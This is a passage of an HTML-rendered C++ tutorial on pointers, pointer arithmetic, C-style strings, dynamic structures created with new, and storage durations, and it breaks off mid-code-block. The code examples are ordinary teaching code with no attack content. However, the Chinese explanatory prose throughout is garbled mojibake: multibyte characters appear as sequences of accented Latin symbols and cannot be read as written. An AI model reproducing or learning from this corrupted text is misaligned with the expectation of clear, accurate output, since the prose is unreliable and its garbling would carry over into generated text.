æ—¶ï¼Œè¿™ä¸ªæ“ä½œæ‰æœ‰æ„ä¹‰ã€‚ç»“æœçš„ç±»å‹æ˜¯ <code>std::ptrdiff_t</code> (åœ¨ <code>&lt;cstddef&gt;</code> ä¸­å®šä¹‰)ã€‚</li><li>  <strong>é€’å¢/é€’å‡:</strong> <code>++p</code>, <code>p++</code>, <code>--p</code>, <code>p--</code> åˆ†åˆ«ä½¿æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªæˆ–ä¸Šä¸€ä¸ªå…ƒç´ ã€‚</li><li>  <strong>æ¯”è¾ƒ:</strong> å¯ä»¥ä½¿ç”¨å…³ç³»è¿ç®—ç¬¦ (<code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>) æ¯”è¾ƒæŒ‡å‘<strong>åŒä¸€ä¸ªæ•°ç»„</strong>å…ƒç´ çš„æŒ‡é’ˆï¼Œåˆ¤æ–­å®ƒä»¬çš„ç›¸å¯¹ä½ç½®ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>==</code> å’Œ <code>!=</code> æ¯”è¾ƒæŒ‡é’ˆæ˜¯å¦æŒ‡å‘åŒä¸€ä¸ªåœ°å€ï¼ˆæˆ–æ˜¯å¦éƒ½ä¸ºç©ºï¼‰ã€‚</li></ul><p><strong>æ•°ç»„ä¸‹æ ‡å’ŒæŒ‡é’ˆçš„å…³ç³»:</strong></p><p>è¡¨è¾¾å¼ <code>arrayName[i]</code> åœ¨ C++ ä¸­ç­‰ä»·äº <code>*(arrayName + i)</code>ã€‚<br>åŒæ ·ï¼Œå¦‚æœ <code>p</code> æ˜¯ä¸€ä¸ªæŒ‡å‘æ•°ç»„å…ƒç´ çš„æŒ‡é’ˆï¼Œ<code>p[i]</code> ç­‰ä»·äº <code>*(p + i)</code>ã€‚</p><p>è¿™æ„å‘³ç€ä½ å¯ä»¥å¯¹æ•°ç»„åä½¿ç”¨æŒ‡é’ˆç®—æœ¯ï¼ˆæ¦‚å¿µä¸Šï¼‰ï¼Œä¹Ÿå¯ä»¥å¯¹æŒ‡é’ˆä½¿ç”¨æ•°ç»„ä¸‹æ ‡è¡¨ç¤ºæ³•ã€‚</p><h3 id="4-8-2-æŒ‡é’ˆå°ç»“"><a href="#4-8-2-æŒ‡é’ˆå°ç»“" class="headerlink" title="4.8.2 æŒ‡é’ˆå°ç»“"></a>4.8.2 æŒ‡é’ˆå°ç»“</h3><p>è®©æˆ‘ä»¬å›é¡¾ä¸€ä¸‹å…³äºæŒ‡é’ˆçš„å…³é”®æ¦‚å¿µï¼š</p><ol><li> <strong>å£°æ˜:</strong> ä½¿ç”¨ <code>typeName * pointerName;</code> å£°æ˜ä¸€ä¸ªæŒ‡å‘ <code>typeName</code> ç±»å‹æ•°æ®çš„æŒ‡é’ˆã€‚</li><li><strong>åˆå§‹åŒ–:</strong><ul><li>  ä½¿ç”¨ <code>&amp;</code> è·å–å˜é‡åœ°å€: <code>pointerName = &amp;variableName;</code></li><li>  åˆå§‹åŒ–ä¸ºç©ºæŒ‡é’ˆ: <code>pointerName = nullptr;</code> (C++11) æˆ– <code>pointerName = 0;</code></li><li>  ä½¿ç”¨ <code>new</code> åˆ†é…åŠ¨æ€å†…å­˜: <code>pointerName = new typeName;</code> æˆ– <code>pointerName = new typeName[size];</code></li></ul></li><li> <strong>è§£å¼•ç”¨:</strong> ä½¿ç”¨ <code>*</code> è®¿é—®æŒ‡é’ˆæŒ‡å‘çš„å€¼: <code>value = *pointerName;</code> æˆ– <code>*pointerName = newValue;</code>ã€‚</li><li> <strong>æŒ‡é’ˆä¸æ•°ç»„:</strong> æ•°ç»„åé€šå¸¸å¯è§†ä¸ºæŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ çš„å¸¸é‡æŒ‡é’ˆã€‚æŒ‡é’ˆç®—æœ¯å…è®¸åœ¨æ•°ç»„å…ƒç´ é—´ç§»åŠ¨ã€‚<code>array[i]</code> ç­‰ä»·äº <code>*(array + i)</code>ã€‚</li><li> <strong>åŠ¨æ€å†…å­˜:</strong> ä½¿ç”¨ <code>new</code> åˆ†é…ï¼Œå¿…é¡»ä½¿ç”¨ <code>delete</code> (å¯¹åº” <code>new</code>) æˆ– <code>delete[]</code> (å¯¹åº” <code>new[]</code>) é‡Šæ”¾ã€‚</li><li> <strong>å±é™©:</strong> æœªåˆå§‹åŒ–æŒ‡é’ˆã€ç©ºæŒ‡é’ˆè§£å¼•ç”¨ã€æ‚¬æŒ‚æŒ‡é’ˆã€å†…å­˜æ³„æ¼ã€é”™è¯¯çš„ <code>delete</code>/<code>delete[]</code> ä½¿ç”¨ã€‚</li><li> <strong>æŒ‡é’ˆæœ¬èº« vs æŒ‡å‘çš„å€¼:</strong> <code>pointerName</code> å­˜å‚¨çš„æ˜¯åœ°å€ï¼Œ<code>*pointerName</code> æ˜¯è¯¥åœ°å€å¤„çš„å€¼ã€‚</li></ol><h3 id="4-8-3-æŒ‡é’ˆå’Œå­—ç¬¦ä¸²"><a href="#4-8-3-æŒ‡é’ˆå’Œå­—ç¬¦ä¸²" class="headerlink" title="4.8.3 æŒ‡é’ˆå’Œå­—ç¬¦ä¸²"></a>4.8.3 æŒ‡é’ˆå’Œå­—ç¬¦ä¸²</h3><p>C é£æ ¼å­—ç¬¦ä¸²æœ¬è´¨ä¸Šæ˜¯ <code>char</code> ç±»å‹çš„æ•°ç»„ï¼Œä»¥ç©ºå­—ç¬¦ <code>\0</code> ç»“å°¾ã€‚å› æ­¤ï¼ŒæŒ‡é’ˆåœ¨å¤„ç† C é£æ ¼å­—ç¬¦ä¸²æ—¶éå¸¸å¸¸ç”¨ã€‚</p><ul><li>  <strong>å­—ç¬¦ä¸²å­—é¢å€¼:</strong> å­—ç¬¦ä¸²å­—é¢å€¼ï¼ˆå¦‚ <code>&quot;Hello&quot;</code>) åœ¨å†…å­˜ä¸­å­˜å‚¨ä¸º <code>const char</code> æ•°ç»„ï¼Œå¹¶ä»¥ <code>\0</code> ç»“å°¾ã€‚å­—ç¬¦ä¸²å­—é¢å€¼æœ¬èº«å¯ä»¥è¢«å½“ä½œæŒ‡å‘å…¶ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ <code>const char*</code> æŒ‡é’ˆã€‚</li><li>  <strong><code>char</code> æŒ‡é’ˆ:</strong> å¯ä»¥å£°æ˜ <code>char*</code> æˆ– <code>const char*</code> æŒ‡é’ˆæ¥æŒ‡å‘ C é£æ ¼å­—ç¬¦ä¸²ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // ä¸ºäº† strlen()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> animal[<span class="number">20</span>] = <span class="string">&quot;bear&quot;</span>; <span class="comment">// animal æ˜¯ char æ•°ç»„</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *bird = <span class="string">&quot;wren&quot;</span>; <span class="comment">// bird æ˜¯æŒ‡å‘ &quot;wren&quot; å­—ç¬¦ä¸²å­—é¢å€¼ç¬¬ä¸€ä¸ªå­—ç¬¦ &#x27;w&#x27; çš„æŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">char</span> *p_animal; <span class="comment">// æœªåˆå§‹åŒ–çš„ char æŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; animal &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; bird &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// cout çŸ¥é“å¦‚ä½•å¤„ç† char* (æ‰“å°ç›´åˆ° \0)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŒ‡é’ˆæŒ‡å‘æ•°ç»„</span></span><br><span class="line">    p_animal = animal; <span class="comment">// p_animal æŒ‡å‘ animal æ•°ç»„çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ &#x27;b&#x27;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pointer p_animal points to: &quot;</span> &lt;&lt; p_animal &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º &quot;bear&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¿é—®å­—ç¬¦ä¸²å†…å®¹</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First char via array: &quot;</span> &lt;&lt; animal[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// b</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First char via pointer: &quot;</span> &lt;&lt; *p_animal &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// b</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŒ‡é’ˆç®—æœ¯éå†å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Using pointer arithmetic:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p_bird = bird;</span><br><span class="line">    <span class="keyword">while</span> (*p_bird != <span class="string">&#x27;\0&#x27;</span>) &#123; <span class="comment">// å¾ªç¯ç›´åˆ°é‡åˆ°ç©ºå­—ç¬¦</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; *p_bird &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        p_bird++; <span class="comment">// æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å­—ç¬¦ä¸²å­—é¢å€¼å’ŒæŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p_literal = <span class="string">&quot;This is a literal&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; p_literal &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// p_literal[0] = &#x27;t&#x27;; // é”™è¯¯! å­—ç¬¦ä¸²å­—é¢å€¼é€šå¸¸æ˜¯åªè¯»çš„ (const char*)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŠ¨æ€åˆ†é…å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">char</span> *p_dynamic_str = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">strlen</span>(<span class="string">&quot;Dynamic String&quot;</span>) + <span class="number">1</span>]; <span class="comment">// +1 ä¸ºäº†ç©ºå­—ç¬¦</span></span><br><span class="line">    <span class="built_in">strcpy</span>(p_dynamic_str, <span class="string">&quot;Dynamic String&quot;</span>); <span class="comment">// ä½¿ç”¨ strcpy å¤åˆ¶ (ä¸å®‰å…¨ï¼Œæœ€å¥½ç”¨ strncpy æˆ– C++ string)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamic string: &quot;</span> &lt;&lt; p_dynamic_str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">delete</span> [] p_dynamic_str; <span class="comment">// é‡Šæ”¾åŠ¨æ€åˆ†é…çš„æ•°ç»„</span></span><br><span class="line">    p_dynamic_str = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„:</strong></p><ul><li>  <code>cout</code> å¯¹ <code>char*</code> æœ‰ç‰¹æ®Šå¤„ç†ï¼Œå®ƒä¼šæ‰“å°ä»æŒ‡é’ˆæŒ‡å‘åœ°å€å¼€å§‹ç›´åˆ°é‡åˆ°ç©ºå­—ç¬¦ <code>\0</code> çš„æ‰€æœ‰å­—ç¬¦ã€‚</li><li>  ä¿®æ”¹å­—ç¬¦ä¸²å­—é¢å€¼æ˜¯æœªå®šä¹‰è¡Œä¸ºï¼Œåº”ä½¿ç”¨ <code>const char*</code> æŒ‡å‘å®ƒä»¬ã€‚</li><li>  å¤„ç† C é£æ ¼å­—ç¬¦ä¸²æ—¶è¦ç‰¹åˆ«æ³¨æ„ç¼“å†²åŒºæº¢å‡ºé—®é¢˜ï¼ˆä¾‹å¦‚ä½¿ç”¨ <code>strcpy</code> æ—¶ç›®æ ‡æ•°ç»„ä¸å¤Ÿå¤§ï¼‰ï¼Œå¹¶ç¡®ä¿å­—ç¬¦ä¸²ä»¥ <code>\0</code> ç»“å°¾ã€‚<code>std::string</code> ç±»é€šå¸¸æ˜¯æ›´å®‰å…¨ã€æ›´æ–¹ä¾¿çš„é€‰æ‹©ã€‚</li></ul><h3 id="4-8-4-ä½¿ç”¨newåˆ›å»ºåŠ¨æ€ç»“æ„"><a href="#4-8-4-ä½¿ç”¨newåˆ›å»ºåŠ¨æ€ç»“æ„" class="headerlink" title="4.8.4 ä½¿ç”¨newåˆ›å»ºåŠ¨æ€ç»“æ„"></a>4.8.4 ä½¿ç”¨newåˆ›å»ºåŠ¨æ€ç»“æ„</h3><p>å°±åƒå¯ä»¥åŠ¨æ€åˆ†é…åŸºæœ¬ç±»å‹å’Œæ•°ç»„ä¸€æ ·ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ <code>new</code> åŠ¨æ€åˆ›å»ºç»“æ„ä½“ï¼ˆæˆ–ç±»ï¼‰å¯¹è±¡ã€‚</p><p><strong>åˆ†é…:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StructureName * pointerVariable = <span class="keyword">new</span> StructureName;</span><br></pre></td></tr></table></figure><p>è¿™ä¼šåœ¨è‡ªç”±å­˜å‚¨åŒºåˆ†é…è¶³å¤Ÿå­˜å‚¨ <code>StructureName</code> ç»“æ„æ‰€æœ‰æˆå‘˜çš„å†…å­˜ï¼Œå¹¶è°ƒç”¨è¯¥ç»“æ„çš„<strong>æ„é€ å‡½æ•°</strong>ï¼ˆå¦‚æœæ˜¯ç±»æˆ–æœ‰æ„é€ å‡½æ•°çš„ç»“æ„ï¼‰ï¼Œç„¶åè¿”å›æŒ‡å‘æ–°åˆ›å»ºç»“æ„çš„æŒ‡é’ˆã€‚</p><p><strong>è®¿é—®æˆå‘˜:</strong></p><p>å½“é€šè¿‡æŒ‡é’ˆè®¿é—®ç»“æ„æˆ–ç±»çš„æˆå‘˜æ—¶ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨ç‚¹è¿ç®—ç¬¦ <code>.</code>ã€‚æœ‰ä¸¤ç§æ–¹å¼ï¼š</p><ol><li> <strong>è§£å¼•ç”¨å†ç”¨ç‚¹ (<code>(*ptr).member</code>)</strong>: å…ˆè§£å¼•ç”¨æŒ‡é’ˆ <code>*ptr</code> å¾—åˆ°ç»“æ„æœ¬èº«ï¼Œç„¶åä½¿ç”¨ç‚¹è¿ç®—ç¬¦è®¿é—®æˆå‘˜ã€‚æ‹¬å·æ˜¯å¿…éœ€çš„ï¼Œå› ä¸ºç‚¹è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§é«˜äºè§£å¼•ç”¨è¿ç®—ç¬¦ã€‚</li><li> <strong>ç®­å¤´è¿ç®—ç¬¦ (<code>ptr-&gt;member</code>)</strong>: è¿™æ˜¯æ›´å¸¸ç”¨ã€æ›´ç®€æ´çš„æ–¹å¼ã€‚ç®­å¤´è¿ç®—ç¬¦ <code>-&gt;</code> ä¸“é—¨ç”¨äºé€šè¿‡æŒ‡é’ˆè®¿é—®å…¶æŒ‡å‘çš„ç»“æ„æˆ–ç±»çš„æˆå‘˜ã€‚<code>ptr-&gt;member</code> å®Œå…¨ç­‰ä»·äº <code>(*ptr).member</code>ã€‚</li></ol><p><strong>é‡Šæ”¾:</strong></p><p>ä½¿ç”¨ <code>delete</code> é‡Šæ”¾ç”± <code>new</code> åˆ›å»ºçš„å•ä¸ªç»“æ„å¯¹è±¡ã€‚<code>delete</code> ä¼šå…ˆè°ƒç”¨è¯¥å¯¹è±¡çš„<strong>ææ„å‡½æ•°</strong>ï¼ˆå¦‚æœéœ€è¦ï¼‰ï¼Œç„¶åé‡Šæ”¾å†…å­˜ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> pointerVariable;</span><br><span class="line">pointerVariable = <span class="literal">nullptr</span>; <span class="comment">// å¥½ä¹ æƒ¯</span></span><br></pre></td></tr></table></figure><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Inflatable</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">float</span> volume;</span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åŠ¨æ€åˆ›å»º Inflatable ç»“æ„</span></span><br><span class="line">    Inflatable *ps = <span class="keyword">new</span> Inflatable; <span class="comment">// åœ¨è‡ªç”±å­˜å‚¨åŒºåˆ›å»ºç»“æ„</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¿é—®æˆå‘˜</span></span><br><span class="line">    <span class="comment">// æ–¹æ³• 1: è§£å¼•ç”¨å’Œç‚¹è¿ç®—ç¬¦</span></span><br><span class="line">    (*ps).name = <span class="string">&quot;Dynamic Floatie&quot;</span>;</span><br><span class="line">    (*ps).volume = <span class="number">1.5f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ–¹æ³• 2: ç®­å¤´è¿ç®—ç¬¦ (æ›´å¸¸ç”¨)</span></span><br><span class="line">    ps-&gt;price = <span class="number">29.99</span>; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamically created structure:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Name: &quot;</span> &lt;&lt; ps-&gt;name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Volume: &quot;</span> &lt;&lt; (*ps).volume &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥ç”¨</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Price: &quot;</span> &lt;&lt; ps-&gt;price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Address: &quot;</span> &lt;&lt; ps &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é‡Šæ”¾åŠ¨æ€åˆ›å»ºçš„ç»“æ„</span></span><br><span class="line">    <span class="keyword">delete</span> ps;</span><br><span class="line">    ps = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Structure deleted.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-8-5-è‡ªåŠ¨å­˜å‚¨ã€é™æ€å­˜å‚¨å’ŒåŠ¨æ€å­˜å‚¨"><a href="#4-8-5-è‡ªåŠ¨å­˜å‚¨ã€é™æ€å­˜å‚¨å’ŒåŠ¨æ€å­˜å‚¨" class="headerlink" title="4.8.5 è‡ªåŠ¨å­˜å‚¨ã€é™æ€å­˜å‚¨å’ŒåŠ¨æ€å­˜å‚¨"></a>4.8.5 è‡ªåŠ¨å­˜å‚¨ã€é™æ€å­˜å‚¨å’ŒåŠ¨æ€å­˜å‚¨</h3><p>C++ ç¨‹åºä¸­çš„å˜é‡å’Œæ•°æ®æ ¹æ®å…¶å†…å­˜åˆ†é…æ–¹å¼å’Œç”Ÿå‘½å‘¨æœŸï¼Œå¯ä»¥åˆ†ä¸ºä¸‰ç§ä¸»è¦çš„å­˜å‚¨ç±»åˆ«ï¼š</p><ol><li><p><strong>è‡ªåŠ¨å­˜å‚¨æŒç»­æ€§ (Automatic Storage Duration):</strong></p><ul><li>  <strong>å†…å­˜åŒºåŸŸ:</strong> é€šå¸¸åœ¨ç§°ä¸º<strong>æ ˆ (Stack)</strong> çš„å†…å­˜åŒºåŸŸåˆ†é…ã€‚</li><li>  <strong>åˆ†é…/é‡Šæ”¾:</strong> å†…å­˜çš„åˆ†é…å’Œé‡Šæ”¾åœ¨å‡½æ•°ï¼ˆæˆ–ä»£ç å—ï¼‰è¿›å…¥å’Œé€€å‡ºæ—¶è‡ªåŠ¨è¿›è¡Œã€‚</li><li>  <strong>ç”Ÿå‘½å‘¨æœŸ:</strong> å˜é‡åœ¨å£°æ˜å®ƒçš„å‡½æ•°æˆ–ä»£ç å—æ‰§è¡ŒæœŸé—´å­˜åœ¨ï¼Œå—ç»“æŸæ—¶è‡ªåŠ¨é”€æ¯ã€‚</li><li>  <strong>ä¾‹å­:</strong> å‡½æ•°å†…éƒ¨å£°æ˜çš„é <code>static</code> å±€éƒ¨å˜é‡ï¼ˆåŒ…æ‹¬å‡½æ•°å‚æ•°ï¼‰ã€‚</li><li>  <strong>ç‰¹ç‚¹:</strong> åˆ†é…å’Œé‡Šæ”¾é€Ÿåº¦å¿«ï¼Œç®¡ç†ç®€å•ï¼ˆè‡ªåŠ¨ï¼‰ï¼Œä½†ç©ºé—´æœ‰é™ï¼Œç”Ÿå‘½å‘¨æœŸå—é™äºä½œç”¨åŸŸã€‚</li></ul></li><li><p><strong>é™æ€å­˜å‚¨æŒç»­æ€§ (Static Storage Duration):</strong></p><ul><li>  <strong>å†…å­˜åŒºåŸŸ:</strong> åœ¨ç¨‹åºçš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…éƒ½å­˜åœ¨äºå†…å­˜çš„æŸä¸ªå›ºå®šåŒºåŸŸï¼ˆé€šå¸¸æ˜¯é™æ€/å…¨å±€æ•°æ®åŒºï¼‰ã€‚</li><li>  <strong>åˆ†é…/é‡Šæ”¾:</strong> å†…å­˜åœ¨ç¨‹åºå¯åŠ¨æ—¶åˆ†é…ï¼ˆæˆ–é¦–æ¬¡ä½¿ç”¨æ—¶ï¼Œå¯¹äºæŸäº›é™æ€å˜é‡ï¼‰ï¼Œåœ¨ç¨‹åºç»“æŸæ—¶é‡Šæ”¾ã€‚</li><li>  <strong>ç”Ÿå‘½å‘¨æœŸ:</strong> ä»ç¨‹åºå¼€å§‹æ‰§è¡Œåˆ°ç¨‹åºç»“æŸã€‚</li><li>  <strong>ä¾‹å­:</strong> åœ¨å‡½æ•°å¤–éƒ¨å£°æ˜çš„å˜é‡ï¼ˆå…¨å±€å˜é‡ï¼‰ã€ä½¿ç”¨ <code>static</code> å…³é”®å­—åœ¨å‡½æ•°å†…éƒ¨æˆ–ç±»å†…éƒ¨å£°æ˜çš„å˜é‡ã€‚</li><li>  <strong>ç‰¹ç‚¹:</strong> ç”Ÿå‘½å‘¨æœŸé•¿ï¼Œå¯ä»¥è·¨å‡½æ•°è°ƒç”¨ä¿æŒå…¶å€¼ï¼Œä½†å…¨å±€å˜é‡å¯èƒ½å¯¼è‡´å‘½åå†²çªå’Œç®¡ç†å¤æ‚æ€§ã€‚</li></ul></li><li><p><strong>åŠ¨æ€å­˜å‚¨æŒç»­æ€§ (Dynamic Storage Duration):</strong></p><ul><li>  <strong>å†…å­˜åŒºåŸŸ:</strong> åœ¨ç§°ä¸º<strong>è‡ªç”±å­˜å‚¨åŒº (Free Store)</strong> æˆ– <strong>å † (Heap)</strong> çš„å†…å­˜åŒºåŸŸåˆ†é…ã€‚</li><li>  <strong>åˆ†é…/é‡Šæ”¾:</strong> å†…å­˜ç”±ç¨‹åºå‘˜ä½¿ç”¨ <code>new</code> (æˆ– <code>malloc</code> ç­‰ C å‡½æ•°) æ˜¾å¼åˆ†é…ï¼Œå¹¶ä¸”<strong>å¿…é¡»</strong>ä½¿ç”¨ <code>delete</code> (æˆ– <code>free</code>) æ˜¾å¼é‡Šæ”¾ã€‚</li><li>  <strong>ç”Ÿå‘½å‘¨æœŸ:</strong> ä» <code>new</code> åˆ†é…æˆåŠŸå¼€å§‹ï¼Œç›´åˆ°ç¨‹åºå‘˜ä½¿ç”¨ <code>delete</code> é‡Šæ”¾ä¸ºæ­¢ã€‚ç”Ÿå‘½å‘¨æœŸä¸å‡½æ•°æˆ–ä»£ç å—çš„ä½œç”¨åŸŸæ— å…³ã€‚</li><li>  <strong>ä¾‹å­:</strong> ä½¿ç”¨ <code>new</code> åˆ›å»ºçš„å˜é‡ã€æ•°ç»„æˆ–å¯¹è±¡ã€‚</li><li>  <strong>ç‰¹ç‚¹:</strong> æä¾›äº†æœ€å¤§çš„çµæ´»æ€§ï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶æ ¹æ®éœ€è¦åˆ†é…ä»»æ„å¤§å°çš„å†…å­˜ï¼Œç”Ÿå‘½å‘¨æœŸç”±ç¨‹åºå‘˜æ§åˆ¶ã€‚ä½†ç®¡ç†å¤æ‚ï¼Œå®¹æ˜“å‡ºç°å†…å­˜æ³„æ¼ï¼ˆå¿˜è®° <code>delete</code>ï¼‰æˆ–æ‚¬æŒ‚æŒ‡é’ˆï¼ˆ<code>delete</code> åä»ä½¿ç”¨æŒ‡é’ˆï¼‰ç­‰é—®é¢˜ã€‚</li></ul></li></ol><p><strong>ç¤ºä¾‹å¯¹æ¯”:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 